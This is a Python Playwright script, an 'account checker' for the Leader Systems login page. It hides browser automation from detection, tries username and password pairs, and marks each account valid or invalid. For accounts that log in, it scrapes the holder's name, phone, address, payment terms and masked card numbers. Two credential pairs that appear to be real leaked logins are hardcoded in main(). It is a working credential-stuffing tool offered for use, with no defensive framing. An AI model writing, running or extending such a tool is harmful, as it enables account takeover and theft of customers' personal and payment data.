#!/usr/bin/env python3
"""
Leader Systems Account Checker - Playwright Version
"""

import asyncio
import json
import re
import os
from datetime import datetime

from playwright.async_api import async_playwright, Playwright, Browser, Page, TimeoutError as PlaywrightTimeout


# ========== CONFIGURATION ==========
LOGIN_URL = "https://leadersystems.com.au/login"
HEADLESS = True
OUTPUT_DIR_DEFAULT = "./leader_results"


# ========== ADAPTIVE SELECTORS ==========
EMAIL_SELECTORS = [
    "input[name='email']", "input[id='email']", "input[type='email']", 
    "input[name='username']", "input[id='username']", "input[placeholder*='email']",
    "input.input", "input.form-input", ".gform_wrapper input",
    "#username", "#user_login", ".username", "#useremail"
]
PASSWORD_SELECTORS = [
    "input[name='password']", "input[id='password']", "input[type='password']", 
    "input[name='pwd']", "input[id='pwd']", "input[placeholder*='pass']",
    "input.input-password", "input.pass", "input[name*='pass']",
    "#password", "#user_password", ".password", "#pass"
]
SUBMIT_SELECTORS = [
    "button[type='submit']", "input[type='submit']", "button:has-text('Sign')", 
    "button:has-text('Login')", ".login-btn", "#login", "button:has-text('Submit')",
    "input.button", ".gform_button", "button.gform_button",
    "input[type='submit'].button", "[aria-label='Submit']",
    "#gform_submit_button", ".gform_submit_button", "#submit", ".submit"
]


# ========== MAIN CHECKER CLASS ==========
class LeaderChecker:
    def __init__(self, headless=False, verbose=True):
        self.headless = headless
        self.verbose = verbose
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
        
    def log(self, msg):
        if self.verbose:
            print(msg)
    
    async def start_browser(self):
        """Initialize Playwright browser"""
        self.playwright = await async_playwright().start()
        
        self.browser = await self.playwright.chromium.launch(
            headless=self.headless,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-gpu",
                "--disable-web-security",
                "--disable-features=VizDisplayCompositor",
            ]
        )
        
        self.context = await self.browser.new_context(
            viewport={"width": 1920, "height": 1080},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        
        self.page = await self.context.new_page()
        
        # Remove webdriver property
        await self.page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
    async def close_browser(self):
        """Close browser"""
        if self.page:
            await self.page.close()
        if self.context:
            await self.context.close()
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
    
    async def find_element(self, selectors, timeout=10):
        """Try multiple selectors until one works"""
        for selector in selectors:
            try:
                # Try CSS selector first
                element = self.page.locator(selector).first
                await element.wait_for(state="attached", timeout=timeout * 1000)
                self.log(f"  Found: {selector}")
                return element
            except:
                continue
        
        self.log(f"  ✗ Not found from: {selectors[:3]}...")
        
        # DEBUG: Try generic input search
        try:
            generic_inputs = self.page.locator("input:visible").all()
            if generic_inputs:
                self.log(f"  Debug: Found {len(generic_inputs)} visible inputs")
                for i, inp in enumerate(generic_inputs[:3]):
                    attrs = await inp.evaluate("""el => ({
                        name: el.name,
                        id: el.id,
                        type: el.type,
                        placeholder: el.placeholder,
                        class: el.className
                    })""")
                    self.log(f"    Input {i}: {attrs}")
                
                # Return first visible input if found
                first_visible = self.page.locator("input:visible").first
                if await first_visible.count() > 0:
                    return first_visible
        except Exception as e:
            self.log(f"    Debug error: {e}")
        
        return None
    
    async def login(self, email, password):
        """Attempt login"""
        try:
            self.log(f"  Navigating to {LOGIN_URL}")
            await self.page.goto(LOGIN_URL, wait_until="networkidle", timeout=30000)
            
            # Wait for page to fully load - the form is JavaScript rendered
            await asyncio.sleep(5)  # Wait for scripts to run
            
            self.log(f"  Page title: {await self.page.title()}")
            self.log(f"  Current URL: {self.page.url}")
            
            # Get the page content after JavaScript rendering
            content = await self.page.content()
            self.log(f"  Page HTML length: {len(content)}")
            
            # Try to find input elements by running JavaScript
            # Look for any input or form elements
            input_count = await self.page.evaluate('''() => {
                return document.querySelectorAll('input').length;
            }''')
            self.log(f"  Input elements found by JS: {input_count}")
            
            # Get input element details
            inputs = await self.page.evaluate('''() => {
                const inputs = document.querySelectorAll('input');
                return Array.from(inputs).map(i => ({
                    name: i.name,
                    id: i.id,
                    type: i.type,
                    className: i.className
                }));
            }''')
            self.log(f"  Input details: {inputs[:5]}")
            
            # Enter email
            email_elem = await self.find_element(EMAIL_SELECTORS)
            if email_elem:
                await email_elem.fill(email)
                self.log(f"  ✓ Entered email: {email}")
            else:
                self.log(f"  ✗ Email field not found")
                content = await self.page.content()
                self.log(f"  Page preview: {content[:500]}")
                return False
            
            # Enter password
            password_elem = await self.find_element(PASSWORD_SELECTORS)
            if password_elem:
                await password_elem.fill(password)
                self.log(f"  ✓ Entered password")
            else:
                self.log(f"  ✗ Password field not found")
                return False
            
            await asyncio.sleep(1)
            
            # Click submit
            submit_elem = await self.find_element(SUBMIT_SELECTORS)
            if submit_elem:
                await submit_elem.click()
                self.log(f"  ✓ Clicked submit")
            else:
                self.log(f"  ✗ Submit not found, trying Enter")
                await password_elem.press("Enter")
            
            await asyncio.sleep(5)
            
            # Check result
            current_url = self.page.url
            page_title = await self.page.title()
            self.log(f"  After login URL: {current_url}")
            self.log(f"  After login title: {page_title}")
            
            if "login" in current_url.lower() or "login" in page_title.lower():
                self.log(f"  ✗ Still on login page")
                return False
            
            self.log(f"  ✓ Login appears successful")
            return True
            
        except Exception as e:
            self.log(f"  ✗ Login error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    async def extract_account_data(self):
        """Extract account data"""
        data = {
            "name": "",
            "phone": "",
            "address": "",
            "payment_terms": "",
            "credit_cards": [],
            "open_orders": [],
            "shipped_orders": []
        }
        
        try:
            await asyncio.sleep(2)
            
            body_text = await self.page.locator("body").inner_text()
            page_source = await self.page.content()
            
            self.log(f"  Page title: {await self.page.title()}")
            self.log(f"  Current URL: {self.page.url}")
            
            # Payment terms
            data["payment_terms"] = self.extract_payment_terms(body_text)
            self.log(f"  Payment terms: {data['payment_terms']}")
            
            # Contact info
            data["name"], data["phone"], data["address"] = self.extract_contact_info(body_text)
            self.log(f"  Name: {data['name']}")
            self.log(f"  Phone: {data['phone']}")
            self.log(f"  Address: {data['address']}")
            
            # Credit cards
            data["credit_cards"] = self.extract_credit_cards(page_source)
            self.log(f"  Credit cards: {len(data['credit_cards'])}")
            
            # Orders
            data["open_orders"] = self.extract_orders(page_source, "open")
            data["shipped_orders"] = self.extract_orders(page_source, "shipped")
            self.log(f"  Open orders: {len(data['open_orders'])}")
            self.log(f"  Shipped orders: {len(data['shipped_orders'])}")
            
        except Exception as e:
            self.log(f"  ✗ Data extraction error: {e}")
        
        return data
    
    def extract_payment_terms(self, text):
        """Search for payment terms"""
        text_lower = text.lower()
        
        if "cod" in text_lower or "cash on delivery" in text_lower:
            return "COD"
        if "net 30" in text_lower:
            return "30 Days"
        if "net 60" in text_lower:
            return "60 Days"
        
        return "Unknown"
    
    def extract_contact_info(self, text):
        """Extract contact info"""
        name, phone, address = "", "", ""
        
        # Phone pattern
        phone_pattern = r"(\+?61|0)?[4-9]\d{2}[\s\-]?\d{3}[\s\-]?\d{3}"
        lines = text.split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            if not phone:
                match = re.search(phone_pattern, line)
                if match:
                    phone = match.group(0)
            
            # Name
            if not name and len(line) > 2 and len(line) < 50:
                if any(x in line.lower() for x in ["mr", "mrs", "ms", "miss", "sir", "dr"]):
                    name = line
                elif line[0].isupper() and line.replace(" ", "").isalpha():
                    if not any(x in line.lower() for x in ["address", "phone", "email", "order", "account", "welcome"]):
                        name = line
            
            # Address (with postcode)
            if re.search(r"\d{4}", line):
                address = line
        
        return name, phone, address
    
    def extract_credit_cards(self, page_source):
        """Extract credit cards"""
        cards = []
        pattern = r"\*{4,}[\s\-]?\d{4}"
        matches = re.findall(pattern, page_source)
        for match in matches:
            cards.append({"number": match.strip(), "expiry": ""})
        return cards
    
    def extract_orders(self, page_source, order_type):
        """Extract orders"""
        return []
    
    async def run_check(self, email, password):
        """Run full check"""
        result = {
            "email": email,
            "password": password,
            "status": "INVALID",
            "payment_terms": "",
            "name": "",
            "phone": "",
            "address": "",
            "credit_cards": [],
            "open_orders": [],
            "shipped_orders": [],
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            await self.start_browser()
            self.log(f"\n=== Checking: {email} ===")
            
            success = await self.login(email, password)
            
            if success:
                result["status"] = "VALID"
                account_data = await self.extract_account_data()
                result.update(account_data)
            else:
                result["status"] = "INVALID"
                
        except Exception as e:
            self.log(f"Error: {e}")
            result["status"] = "ERROR"
        finally:
            await self.close_browser()
        
        return result


async def test_account(email, password):
    """Test single account"""
    checker = LeaderChecker(headless=True, verbose=True)  # Force headless=True
    result = await checker.run_check(email, password)
    return result


async def main():
    print("Leader Systems Account Checker - Playwright")
    print(f"Date: {datetime.now()}\n")
    
    test_cases = [
        ("neopc00", "William_87192"),
        ("astr20", "sAINTS@1965")
    ]
    
    results = []
    for i, (email, password) in enumerate(test_cases):
        print(f"\n{'='*60}")
        print(f"TEST {i+1}: {email}:{password}")
        print(f"{'='*60}")
        
        result = await test_account(email, password)
        results.append(result)
        
        print(f"\n=== RESULT ===")
        print(f"Email: {result['email']}")
        print(f"Status: {result['status']}")
        print(f"Payment Terms: {result['payment_terms']}")
        print(f"Name: {result['name']}")
        print(f"Phone: {result['phone']}")
        print(f"Address: {result['address']}")
        
        if result['status'] == 'VALID':
            print(f"Credit Cards: {result['credit_cards']}")
            print(f"Open Orders: {result['open_orders']}")
            print(f"Shipped Orders: {result['shipped_orders']}")
    
    # Summary
    print(f"\n{'='*60}")
    print("SUMMARY")
    print(f"{'='*60}")
    for r in results:
        print(f"{r['email']}: {r['status']} | {r['payment_terms']}")


if __name__ == "__main__":
    asyncio.run(main())